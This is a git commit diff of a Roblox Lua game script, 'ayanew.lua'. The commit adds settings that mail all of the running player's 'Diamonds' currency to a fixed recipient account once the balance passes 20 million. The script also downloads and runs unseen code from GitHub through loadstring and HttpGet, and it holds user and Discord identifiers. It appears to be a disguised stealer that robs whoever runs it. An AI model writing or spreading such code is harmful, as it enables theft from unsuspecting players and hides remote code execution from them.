8eeccd97272194e604a3e8b115cfa46e098650ef
Tgavb <102312281+dsadgeee@users.noreply.github.com>
2025-10-25 01:15:01 -0700

    Update ayanew.lua

--- ayanew.lua
+++ ayanew.lua
@@ -1,3 +1,22 @@
+wait(3)
+-- ⚙️ SETTINGS
+getgenv().Settings = {
+    Mailing = {
+        ["Diamonds"] = {
+            Class = "Currency",
+            Amount = "All",        -- gửi toàn bộ khi đạt ngưỡng
+            MinDiamonds = 20000000 -- ngưỡng tối thiểu (ví dụ: 20 triệu)
+        },
+    },
+    Users = {
+        "DreamSoCow",  -- người nhận
+    },
+    ["Split Items Evenly"] = false,
+    ["Only Online Accounts"] = false,
+    ["Developer Mode"] = false,
+    [[ THANK YOU, YOUR MOM SO FAT <3! ]]
+}
+-- ⚙️ CONFIG
 _G.Config = {
     UserID = "0d28ea66-a410-47c0-a707-06d7cb199774",
     discord_id = "698853568291143821",
@@ -5,4 +24,4 @@ _G.Config = {
 }
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/yummytrack/main/tracker"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/pet99"))()
+loadstring(game:HttpGet("https://github.com/dsadgeee/21521521/blob/main/track.lua"))()
